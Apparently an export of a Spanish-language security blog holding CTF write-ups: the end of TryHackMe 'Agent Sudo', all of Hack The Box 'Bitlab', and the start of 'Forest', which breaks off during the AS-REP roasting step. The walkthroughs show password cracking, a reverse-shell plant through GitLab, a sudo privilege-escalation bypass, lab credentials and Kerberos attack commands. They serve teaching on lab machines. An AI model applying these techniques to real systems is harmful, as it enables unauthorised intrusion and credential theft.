connection for cute-alien.jpg (33143 bytes). 226 Transfer complete. 33143 bytes received in 0.22 secs (145.3596 kB/s) mget cutie.webp? y 200 PORT command successful. Consider using PASV. 150 Opening BINARY mode data connection for cutie.webp (34842 bytes). 226 Transfer complete. 34842 bytes received in 0.35 secs (95.8564 kB/s) ftp\u0026gt; En el archivo de texto nos muestra un mensaje para el Agente J, en el que explica que la contraseña esta dentro de la imagen falsa.\n1 2 3 4 5 6 7 root@aoiri:~/tryhackme/agentsudo# cat To_agentJ.txt Dear agent J, All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn\u0026#39;t be a problem for you. From, Agent C STEGO Utilizamos binwalk para ver el contenido de las imagenes y vemos que la imagen PNG tiene un archivo de texto.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 root@aoiri:~/tryhackme/agentsudo/tmp# binwalk cute-alien.jpg DECIMAL HEXADECIMAL DESCRIPTION -------------------------------------------------------------------------------- 0 0x0 JPEG image data, JFIF standard 1.01 root@aoiri:~/tryhackme/agentsudo/tmp# binwalk cutie.webp DECIMAL HEXADECIMAL DESCRIPTION -------------------------------------------------------------------------------- 0 0x0 PNG image, 528 x 528, 8-bit colormap, non-interlaced 869 0x365 Zlib compressed data, best compression 34562 0x8702 Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt 34820 0x8804 End of Zip archive, footer length: 22 root@aoiri:~/tryhackme/agentsudo/tmp# Extraemos el contenido de la imagen con binwalk y encontramos un archivo comprimido que contiene el archivo de texto, utilizamos john the ripper para obtener la contraseña por fuerza bruta.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 root@aoiri:~/tryhackme/agentsudo/tmp/_cutie.webp.extracted# zip2john 8702.zip \u0026gt; hash_zip ver 81.9 8702.zip/To_agentR.txt is not encrypted, or stored with non-handled compression type root@aoiri:~/tryhackme/agentsudo/tmp/_cutie.webp.extracted# cat hash_zip 8702.zip/To_agentR.txt:$zip2$*0*1*0*4673cae714579045*67aa*4e[... hash-here-dont-show-cuz-tryhackme-ban-me-:v-end ...]*$/zip2$:To_agentR.txt:8702.zip:8702.zip root@aoiri:~/tryhackme/agentsudo/tmp/_cutie.webp.extracted# john hash_zip Using default input encoding: UTF-8 Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 256/256 AVX2 8x]) Will run 2 OpenMP threads Proceeding with single, rules:Single Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status Almost done: Processing the remaining buffered candidate passwords, if any. Warning: Only 10 candidates buffered for the current salt, minimum 16 needed for performance. Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist ***** (8702.zip/To_agentR.txt) 1g 0:00:00:00 DONE 2/3 (2020-02-04 22:58) 1.052g/s 46303p/s 46303c/s 46303C/s 123456..Peter Use the \u0026#34;--show\u0026#34; option to display all of the cracked passwords reliably Session completed root@aoiri:~/tryhackme/agentsudo/tmp/_cutie.webp.extracted# Extraemos los archivos del archivo zip:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 root@aoiri:~/tryhackme/agentsudo/tmp/_cutie.webp.extracted# 7z x 8702.zip 7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21 p7zip Version 16.02 (locale=en_US.utf8,Utf16=on,HugeFiles=on,64 bits,2 CPUs Intel(R) Core(TM) i5-8250U CPU @ 1.60GHz (806EA),ASM,AES-NI) Scanning the drive for archives: 1 file, 280 bytes (1 KiB) Extracting archive: 8702.zip -- Path = 8702.zip Type = zip Physical Size = 280 Enter password (will not be echoed): ***** Everything is Ok Size: 86 Compressed: 280 root@aoiri:~/tryhackme/agentsudo/tmp/_cutie.webp.extracted# ls 365 365.zlib 8702.zip hash_zip To_agentR.txt Vemos un mensaje que nos muestra la contraseña de la que nos mencionaba la anterior nota:\n1 2 3 4 5 6 7 8 root@aoiri:~/tryhackme/agentsudo/tmp/_cutie.webp.extracted# cat To_agentR.txt Agent C, We need to send the picture to \u0026#39;*******\u0026#39; as soon as possible! By, Agent R root@aoiri:~/tryhackme/agentsudo/tmp/_cutie.webp.extracted# Utilizamos la contraseña (decodificada en base64) para obtener los archivos de la imagen JPG:\n1 2 3 4 5 6 7 8 9 10 11 12 13 root@aoiri:~/tryhackme/agentsudo/tmp# steghide extract -sf cute-alien.jpg Enter passphrase: wrote extracted data to \u0026#34;message.txt\u0026#34;. root@aoiri:~/tryhackme/agentsudo/tmp# cat message.txt Hi james, Glad you find this message. Your login password is ************ Don\u0026#39;t ask me why the password look cheesy, ask agent R who set this password for you. Your buddy, chris root@aoiri:~/tryhackme/agentsudo/tmp# SSH - User Ahora que tenemos las credenciales, las utilizamos con el servicio SSH de la maquina, obtenemos nuestra shell y nuestra flag user.txt.\nPRIVILEGE ESCALATION Hacemos una enumeracion sencilla con sudo -l para listar los comandos/archivos que podemos ejecutar sin contraseña y con privilegios root, vemos /bin/bash pero al intentar ejecutarlo con sudo no se ejecuta.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 james@agent-sudo:~$ sudo -l -l [sudo] password for james: Matching Defaults entries for james on agent-sudo: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User james may run the following commands on agent-sudo: Sudoers entry: RunAsUsers: ALL, !root Commands: /bin/bash james@agent-sudo:~$ sudo /bin/bash Sorry, user james is not allowed to execute \u0026#39;/bin/bash\u0026#39; as root on agent-sudo. james@agent-sudo:~$ Buscamos una vulnerabilidad para sudo y vemos que existe un exploit con el cual podemos obtener acceso de superusuario.\nsudo 1.8.27 - Security Bypass\nDescargamos el exploit, lo ejecutamos, obtenemos nuestra shell y nuestra flag root.txt.\n","description":"Agent Sudo es una maquina de TryHackMe, utilizamos burpsuite para encontrar el nombre de uno de los agentes seguidamente de un usuario, hydra para obtener acceso al servicio FTP, finalmente un reto de esteganografia para obtener las credenciales de acceso a la maquina. Mediante una vulnerabilidad en Sudo obtuvimos acceso root.","id":170,"section":"posts","tags":["ftp","steganography","steghide","binwalk","sudo privesc"],"title":"TryHackMe - Agent Sudo","uri":"https://sckull.github.io/posts/agent_sudo/"},{"content":"\rBitlab corre GitLab, encontramos credenciales en codigo ofuscado de JavaScript para obtener acceso modificamos un repositorio. Ralizar un query a la base de datos Postgres nos permitio obtener credenciales para el movimiento lateral. Ollydbg nos permitio encontrar credenciales dentro de un ejecutable para escalar privilegios.\nInformacion de la Maquina Nombre Bitlab OS Linux Puntos 30 Dificultad Media IP 10.10.10.114 Maker Frey thek Matrix\r{\r\u0026#34;type\u0026#34;:\u0026#34;radar\u0026#34;,\r\u0026#34;data\u0026#34;:{\r\u0026#34;labels\u0026#34;:[\u0026#34;Enumeration\u0026#34;,\u0026#34;Real-Life\u0026#34;,\u0026#34;CVE\u0026#34;,\u0026#34;Custom Explotation\u0026#34;,\u0026#34;CTF-Like\u0026#34;],\r\u0026#34;datasets\u0026#34;:[\r{\r\u0026#34;label\u0026#34;:\u0026#34;User Rate\u0026#34;, \u0026#34;data\u0026#34;:[7.4, 7.4, 4.6, 5.4, 2.6],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(75, 162, 189,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#4ba2bd\u0026#34;\r},\r{ \u0026#34;label\u0026#34;:\u0026#34;Maker Rate\u0026#34;,\r\u0026#34;data\u0026#34;:[10, 10, 6, 4, 0],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(154, 204, 20,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#9acc14\u0026#34;\r}\r]\r},\r\u0026#34;options\u0026#34;: {\u0026#34;scale\u0026#34;: {\u0026#34;ticks\u0026#34;: {\u0026#34;backdropColor\u0026#34;:\u0026#34;rgba(0,0,0,0)\u0026#34;},\r\u0026#34;angleLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;},\r\u0026#34;gridLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;}\r}\r}\r} MASSCAN \u0026amp; NMAP Escaneo de puerto tcp/udp, en el cual nos muestra el puerto http (80) y el puerto de ssh (22) abierto.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 root@kali:~/htb/bitlab# masscan -p1-65535,U:1-65535 10.10.10.114 --rate=1000 -e tun0 Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2019-09-24 23:21:55 GMT -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth Initiating SYN Stealth Scan Scanning 1 hosts [131070 ports/host] Discovered open port 80/tcp on 10.10.10.114 Discovered open port 22/tcp on 10.10.10.114 root@kali:~/htb/bitlab# nmap -p- --min-rate 1000 10.10.10.114 Starting Nmap 7.80 ( https://nmap.org ) at 2019-09-24 19:23 EDT Nmap scan report for 10.10.10.114 Host is up (0.34s latency). Not shown: 65533 filtered ports PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Nmap done: 1 IP address (1 host up) scanned in 133.40 seconds # Nmap 7.80 scan initiated Tue Sep 24 19:26:19 2019 as: nmap -sV -sC -p22,80 -o nmap.scan 10.10.10.114 Nmap scan report for 10.10.10.114 Host is up (0.083s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 a2:3b:b0:dd:28:91:bf:e8:f9:30:82:31:23:2f:92:18 (RSA) | 256 e6:3b:fb:b3:7f:9a:35:a8:bd:d0:27:7b:25:d4:ed:dc (ECDSA) |_ 256 c9:54:3d:91:01:78:03:ab:16:14:6b:cc:f0:b7:3a:55 (ED25519) 80/tcp open http nginx | http-robots.txt: 55 disallowed entries (15 shown) | / /autocomplete/users /search /api /admin /profile | /dashboard /projects/new /groups/new /groups/*/edit /users /help |_/s/ /snippets/new /snippets/*/edit | http-title: Sign in \\xC2\\xB7 GitLab |_Requested resource was http://10.10.10.114/users/sign_in |_http-trane-info: Problem with XML parsing of /evox/about Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Tue Sep 24 19:26:30 2019 -- 1 IP address (1 host up) scanned in 11.04 seconds HTTP Dentro del servicio de http nos muestra un panel de inicio de sesion de lo que parece gitlab.\nRobots.txt\nDentro del archivo robots.txt encontramos diferentes rutas en las cuales la mayoria nos redirige a /users/sign_in, en la unica en la que podemos navegar es en /explore pero en esta ruta no encontramos nada interesante.\nAl visitar distintas rutas dentro de esta pagina encontramos que en /help hay un archivo de html que al visitarlo contiene direcciones hacia otra pagina, menos la ultima que contiene codigo javascript codificado.\nBookmarks.html\nCodigo javascript:\n1 javascript:(function(){ var _0x4b18=[\u0026#34;\\x76\\x61\\x6C\\x75\\x65\u0026#34;,\u0026#34;\\x75\\x73\\x65\\x72\\x5F\\x6C\\x6F\\x67\\x69\\x6E\u0026#34;,\u0026#34;\\x67\\x65\\x74\\x45\\x6C\\x65\\x6D\\x65\\x6E\\x74\\x42\\x79\\x49\\x64\u0026#34;,\u0026#34;\\x63\\x6C\\x61\\x76\\x65\u0026#34;,\u0026#34;\\x75\\x73\\x65\\x72\\x5F\\x70\\x61\\x73\\x73\\x77\\x6F\\x72\\x64\u0026#34;,\u0026#34;\\x31\\x31\\x64\\x65\\x73\\x30\\x30\\x38\\x31\\x78\u0026#34;];document[_0x4b18[2]](_0x4b18[1])[_0x4b18[0]]= _0x4b18[3];document[_0x4b18[2]](_0x4b18[4])[_0x4b18[0]]= _0x4b18[5]; })() Codigo decodificado:\n1 2 3 4 5 6 javascript:(function(){ document[\u0026#34;getElementById\u0026#34;](\u0026#34;user_login\u0026#34;)[\u0026#34;value\u0026#34;]= \u0026#34;clave\u0026#34;; document[\u0026#34;getElementById\u0026#34;](\u0026#34;user_password\u0026#34;)[\u0026#34;value\u0026#34;]= \u0026#34;11des0081x\u0026#34;\u0026#34;; } )() GitLab Login Utilizamos las credenciales clave:11des0081x para iniciar sesion y vemos que hay diferentes proyectos dentro de gitlab.\nSHELL - Gitlab / Profile Dentro de los repositorios encontramos uno que tiene como nombre Profile, dentro de este repositorio se encuentra un archivo php (index.php) en el cual podemos ver codigo que pertenece a la pagina /profile/.\nindex.php /profile Realizamos un cambio dentro del codigo de index.php y realizamos un merge para intentar modificar la pagina /profile.\nindex.php merge\nPodemos observar que en la pagina de profile se encuentra nuestro codigo con el texto que insertamos.\nAhora que sabemos que podemos modificar codigo dentro de la pagina index, vamos a intentar crear un archivo en el repositorio con una shell inversa.\nhello.php\nexecInBackground\nnetcat\nObtenemos una shell como usuario www-data.\nSnippet - Postgres Dentro de gitlab tambien encontramos un snippet que contiene nombre, usuario y contraseña para una base de datos en postgres.\nCodigo:\n1 2 3 \u0026lt;?php $db_connection = pg_connect(\u0026#34;host=localhost dbname=profiles user=profiles password=profiles\u0026#34;); $result = pg_query($db_connection, \u0026#34;SELECT * FROM profiles\u0026#34;); Utilizamos la porcion de codigo para ejecutarlo dentro de la maquina con php, agregando una porcion de codigo para obtener el resultado del query de la tabla profiles.\n1 2 3 4 5 6 \u0026lt;?php $db_connection = pg_connect(\u0026#34;host=localhost dbname=profiles user=profiles password=profiles\u0026#34;); $result = pg_query($db_connection, \u0026#34;SELECT * FROM profiles\u0026#34;); $arr = pg_fetch_all($result); print_r($arr); ?\u0026gt; Codigo ejecutado:\nAl ejecutar el codigo nos devuelve un usuario y contraseña, la contraseña codificada en base64.\nCredenciales:\nclave:c3NoLXN0cjBuZy1wQHNz==\rclave:ssh-str0ng-p@ss SHELL - Usuario clave Actualizamos nuestra shell al intentar ingresar con la contraseña decodificada no la aceptó, utilizamos la codificada y obtuvimos shell como usuario clave.\nY Nuestra flag user.txt.\nRE - RemoteConnection.exe Dentro de la carpeta principal del usuario clave encontramos un archivo exe, trasladamos el archivo a nuestra maquina local para poder analizar el archivo.\nUtilizamos ollydbg en su version 2.01 agregamos nuestro ejecutable en la interfaz de olly.\nAl correr nuestro ejecutable nos muestra un mensaje en la ventana de ejecucion del archivo (Acceso Denegado).\nBuscamos el mensaje que nos muestra en la ventana haciendo click dentro de la ventana Search for \u0026gt; All References Strings.\nEncontramos varios mensajes (strings) vemos una string que es distinta a las demas colocamos un breakpoint en el string y volvemos a ejecutar y presionar F8.\nVemos nuestro breakpoint.\nVemos la conexion con el usuario root hacia la maquina de bitlab con la contraseña.\nCredenciales:\n-ssh root@gitlab.htb -pw Qf7]8YSV.wDNF*[7d?j\u0026amp;eD4^\u0026#34;\rroot:Qf7]8YSV.wDNF*[7d?j\u0026amp;eD4^\u0026#34; Utilizamos las credenciales y obtenemos una shell con el usuario root y nuestra flag root.txt.\n","description":"Bitlab corre GitLab, encontramos credenciales en codigo ofuscado de JavaScript para obtener acceso modificamos un repositorio. Ralizar un query a la base de datos Postgres nos permitio obtener credenciales para el movimiento lateral. Ollydbg nos permitio encontrar credenciales dentro de un ejecutable para escalar privilegios.","id":171,"section":"posts","tags":["ollydbg","gitlab","javascript","deofuscation","postgresql"],"title":"Hack The Box - Bitlab","uri":"https://sckull.github.io/posts/bitlab/"},{"content":"\rForest de HackThebox. Encontramos una lista de usuarios con enum4linux los cuales utilizamos con Impacket para realizar AS-REP Roasting attack con lo cual obtuvimos credenciales y acceso por WinRM. Con BloodHound enumeramos y con Aclpwn obtuvimos privilegios administrativos para luego dumpear los hashes y finalmente realizar Pass-the-Hash para obtener una shell como administrador.\nInformacion de la Maquina Nombre Forest OS Windows Puntos 20 Dificultad Facil IP 10.10.10.161 Maker egre55 mrb3n Matrix\r{\r\u0026#34;type\u0026#34;:\u0026#34;radar\u0026#34;,\r\u0026#34;data\u0026#34;:{\r\u0026#34;labels\u0026#34;:[\u0026#34;Enumeration\u0026#34;,\u0026#34;Real-Life\u0026#34;,\u0026#34;CVE\u0026#34;,\u0026#34;Custom Explotation\u0026#34;,\u0026#34;CTF-Like\u0026#34;],\r\u0026#34;datasets\u0026#34;:[\r{\r\u0026#34;label\u0026#34;:\u0026#34;User Rate\u0026#34;, \u0026#34;data\u0026#34;:[8.1, 8.6, 6.8, 3.2, 1.4],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(75, 162, 189,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#4ba2bd\u0026#34;\r},\r{ \u0026#34;label\u0026#34;:\u0026#34;Maker Rate\u0026#34;,\r\u0026#34;data\u0026#34;:[7, 10, 8, 2, 0],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(154, 204, 20,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#9acc14\u0026#34;\r}\r]\r},\r\u0026#34;options\u0026#34;: {\u0026#34;scale\u0026#34;: {\u0026#34;ticks\u0026#34;: {\u0026#34;backdropColor\u0026#34;:\u0026#34;rgba(0,0,0,0)\u0026#34;},\r\u0026#34;angleLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;},\r\u0026#34;gridLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;}\r}\r}\r} MASSCAN \u0026amp; NMAP Escaneo de puerto tcp/udp, en el cual nos muestra varios puertos abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 root@kali:~/htb/forest# masscan -p1-65535,U:1-65535 10.10.10.161 --rate=1000 -e tun0 Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-10-25 04:57:31 GMT -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth Initiating SYN Stealth Scan Scanning 1 hosts [131070 ports/host] Discovered open port 135/tcp on 10.10.10.161 Discovered open port 464/tcp on 10.10.10.161 Discovered open port 49910/tcp on 10.10.10.161 Discovered open port 58925/udp on 10.10.10.161 Discovered open port 445/tcp on 10.10.10.161 Discovered open port 139/tcp on 10.10.10.161 Discovered open port 49664/tcp on 10.10.10.161 Discovered open port 9389/tcp on 10.10.10.161 Discovered open port 49671/tcp on 10.10.10.161 Discovered open port 49666/tcp on 10.10.10.161 Discovered open port 3269/tcp on 10.10.10.161 Discovered open port 593/tcp on 10.10.10.161 Discovered open port 49667/tcp on 10.10.10.161 Discovered open port 49676/tcp on 10.10.10.161 Discovered open port 49703/tcp on 10.10.10.161 Discovered open port 49684/tcp on 10.10.10.161 Discovered open port 53/tcp on 10.10.10.161 # Nmap 7.70 scan initiated Fri Oct 25 01:01:38 2019 as: nmap -p- --min-rate 1000 -o nmap.scan 10.10.10.161 Warning: 10.10.10.161 giving up on port because retransmission cap hit (10). Nmap scan report for 10.10.10.161 Host is up (0.23s latency). Not shown: 63731 closed ports, 1780 filtered ports PORT STATE SERVICE 53/tcp open domain 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap 445/tcp open microsoft-ds 464/tcp open kpasswd5 593/tcp open http-rpc-epmap 636/tcp open ldapssl 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl 5985/tcp open wsman 9389/tcp open adws 47001/tcp open winrm 49664/tcp open unknown 49665/tcp open unknown 49666/tcp open unknown 49667/tcp open unknown 49671/tcp open unknown 49676/tcp open unknown 49677/tcp open unknown 49684/tcp open unknown 49703/tcp open unknown 49910/tcp open unknown # Nmap done at Fri Oct 25 01:06:47 2019 -- 1 IP address (1 host up) scanned in 308.58 seconds # Nmap 7.70 scan initiated Fri Oct 25 01:08:05 2019 as: nmap -sV -sC -p- --min-rate 1000 -o script_nmap.scan 10.10.10.161 Warning: 10.10.10.161 giving up on port because retransmission cap hit (10). Nmap scan report for 10.10.10.161 Host is up (0.26s latency). Not shown: 64311 closed ports, 1201 filtered ports PORT STATE SERVICE VERSION 53/tcp open domain? | fingerprint-strings: | DNSVersionBindReqTCP: | version |_ bind 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2019-10-25 05:20:03Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name) 445/tcp open microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB) 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name) 3269/tcp open tcpwrapped 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 9389/tcp open mc-nmf .NET Message Framing 47001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 49664/tcp open msrpc Microsoft Windows RPC 49665/tcp open msrpc Microsoft Windows RPC 49666/tcp open msrpc Microsoft Windows RPC 49667/tcp open msrpc Microsoft Windows RPC 49671/tcp open msrpc Microsoft Windows RPC 49676/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 49677/tcp open msrpc Microsoft Windows RPC 49684/tcp open msrpc Microsoft Windows RPC 49703/tcp open msrpc Microsoft Windows RPC 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port53-TCP:V=7.70%I=7%D=10/25%Time=5DB2843D%P=x86_64-pc-linux-gnu%r(DNS SF:VersionBindReqTCP,20,\u0026#34;\\0\\x1e\\0\\x06\\x81\\x04\\0\\x01\\0\\0\\0\\0\\0\\0\\x07version SF:\\x04bind\\0\\0\\x10\\0\\x03\u0026#34;); Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: 2h27m49s, deviation: 4h02m51s, median: 7m36s | smb-os-discovery: | OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3) | Computer name: FOREST | NetBIOS computer name: FOREST\\x00 | Domain name: htb.local | Forest name: htb.local | FQDN: FOREST.htb.local |_ System time: 2019-10-24T22:23:05-07:00 | smb-security-mode: | account_used: \u0026lt;blank\u0026gt; | authentication_level: user | challenge_response: supported |_ message_signing: required | smb2-security-mode: | 2.02: |_ Message signing enabled and required | smb2-time: | date: 2019-10-25 01:22:33 |_ start_date: 2019-10-25 00:22:54 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Fri Oct 25 01:16:55 2019 -- 1 IP address (1 host up) scanned in 529.48 seconds ENUM4LINUX Vemos que tenemos muchos puertos por enumerar vamos a iniciar con windows en samba con enum4linux, enumerando los usuarios dentro de la maquina.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 root@kali:~/htb/forest# enum4linux -U -l 10.10.10.161 Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Fri Nov 1 04:31:58 2019 ========================== | Target Information | ========================== Target ........... 10.10.10.161 RID Range ........ 500-550,1000-1050 Username ......... \u0026#39;\u0026#39; Password ......... \u0026#39;\u0026#39; Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none ==================================================== | Enumerating Workgroup/Domain on 10.10.10.161 | ==================================================== [E] Can\u0026#39;t find workgroup/domain ===================================== | Session Check on 10.10.10.161 | ===================================== Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 437. [+] Server 10.10.10.161 allows sessions using username \u0026#39;\u0026#39;, password \u0026#39;\u0026#39; Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 451. [+] Got domain/workgroup name: ===================================================== | Getting information via LDAP for 10.10.10.161 | ===================================================== [+] Long domain name for 10.10.10.161: htb.local [+] 10.10.10.161 appears to be a root/parent DC =========================================== | Getting domain SID for 10.10.10.161 | =========================================== Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 359. Domain Name: HTB Domain Sid: S-1-5-21-3072663084-364016917-1341370565 [+] Host is part of a domain (not a workgroup) ============================= | Users on 10.10.10.161 | ============================= Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 866. index: 0x2137 RID: 0x463 acb: 0x00020015 Account: $331000-VK4ADACQNUCA\tName: (null)\tDesc: (null) index: 0xfbc RID: 0x1f4 acb: 0x00020010 Account: Administrator\tName: Administrator\tDesc: Built-in account for administering the computer/domain index: 0x2369 RID: 0x47e acb: 0x00000210 Account: andy\tName: Andy Hislip\tDesc: (null) index: 0xfbe RID: 0x1f7 acb: 0x00000215 Account: DefaultAccount\tName: (null)\tDesc: A user account managed by the system. index: 0xfbd RID: 0x1f5 acb: 0x00000215 Account: Guest\tName: (null)\tDesc: Built-in account for guest access to the computer/domain [... REDACTED ...] index: 0xff4 RID: 0x1f6 acb: 0x00020011 Account: krbtgt\tName: (null)\tDesc: Key Distribution Center Service Account index: 0x2360 RID: 0x47a acb: 0x00000210 Account: lucinda\tName: Lucinda Berger\tDesc: (null) index: 0x236a RID: 0x47f acb: 0x00000210 Account: mark\tName: Mark Brandt\tDesc: (null) index: 0x236b RID: 0x480 acb: 0x00000210 Account: santi\tName: Santi Rodriguez\tDesc: (null) index: 0x235c RID: 0x479 acb: 0x00000210 Account: sebastien\tName: Sebastien Caron\tDesc: (null) index: 0x215a RID: 0x468 acb: 0x00020011 Account: SM_1b41c9286325456bb\tName: Microsoft Exchange Migration\tDesc: (null) index: 0x2161 RID: 0x46c acb: 0x00020011 Account: SM_1ffab36a2f5f479cb\tName: SystemMailbox{8cc370d3-822a-4ab8-a926-bb94bd0641a9}\tDesc: (null) index: 0x2156 RID: 0x464 acb: 0x00020011 Account: SM_2c8eef0a09b545acb\tName: Microsoft Exchange Approval Assistant\tDesc: (null) index: 0x2159 RID: 0x467 acb: 0x00020011 Account: SM_681f53d4942840e18\tName: Discovery Search Mailbox\tDesc: (null) index: 0x2158 RID: 0x466 acb: 0x00020011 Account: SM_75a538d3025e4db9a\tName: Microsoft Exchange\tDesc: (null) index: 0x215c RID: 0x46a acb: 0x00020011 Account: SM_7c96b981967141ebb\tName: E4E Encryption Store - Active\tDesc: (null) index: 0x215b RID: 0x469 acb: 0x00020011 Account: SM_9b69f1b9d2cc45549\tName: Microsoft Exchange Federation Mailbox\tDesc: (null) index: 0x215d RID: 0x46b acb: 0x00020011 Account: SM_c75ee099d0a64c91b\tName: Microsoft Exchange\tDesc: (null) index: 0x2157 RID: 0x465 acb: 0x00020011 Account: SM_ca8c2ed5bdab4dc9b\tName: Microsoft Exchange\tDesc: (null) index: 0x2365 RID: 0x47b acb: 0x00010210 Account: svc-alfresco\tName: svc-alfresco\tDesc: (null) Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 881. user:[Administrator] rid:[0x1f4] user:[Guest] rid:[0x1f5] user:[krbtgt] rid:[0x1f6] user:[DefaultAccount] rid:[0x1f7] [... REDACTED ...] user:[sebastien] rid:[0x479] user:[lucinda] rid:[0x47a] user:[svc-alfresco] rid:[0x47b] user:[andy] rid:[0x47e] user:[mark] rid:[0x47f] user:[santi] rid:[0x480] enum4linux complete on Fri Nov 1 04:32:35 2019 KERBEROS - impacket GetNPUsers Obtuvimos poca informacion sobre el puerto de ldap, pero obtuvimos una lista de usuarios, vamos al puerto 88 de autenticacion de kerberos para obtener informacion sobre ese puerto utilizando la lista de usuarios y uno de los scripts de impacket para verificar si uno de los usuarios nos permite recolectar mensajes AS_REP sin pre autenticacion.\nLista de Usuarios:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 Administrator Guest krbtgt DefaultAccount $331000-VK4ADACQNUCA SM_2c8eef0a09b545acb SM_ca8c2ed5bdab4dc9b SM_75a538d3025e4db9a SM_681f53d4942840e18 SM_1b41c9286325456bb SM_9b69f1b9d2cc45549 SM_7c96b981967141ebb SM_c75ee099d0a64c91b SM_1ffab36a2f5f479cb HealthMailboxc3d7722 HealthMailboxfc9daad HealthMailboxc0a90c9 HealthMailbox670628e HealthMailbox968e74d HealthMailbox6ded678 HealthMailbox83d6781 HealthMailboxfd87238 HealthMailboxb01ac64 HealthMailbox7108a4e HealthMailbox0659cc1 sebastien lucinda svc-alfresco andy mark santi Ejecucion de script de impacket:\n1 2 3 4 5 6 7 8 9 10 11 12 root@kali:~/impacket/examples# python GetNPUsers.py HTB/ -usersfile users -format hashcat -outputfile hashes.asreproast -dc-ip 10.10.10.161 Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation [-] User Administrator doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set [-] Kerberos SessionError: 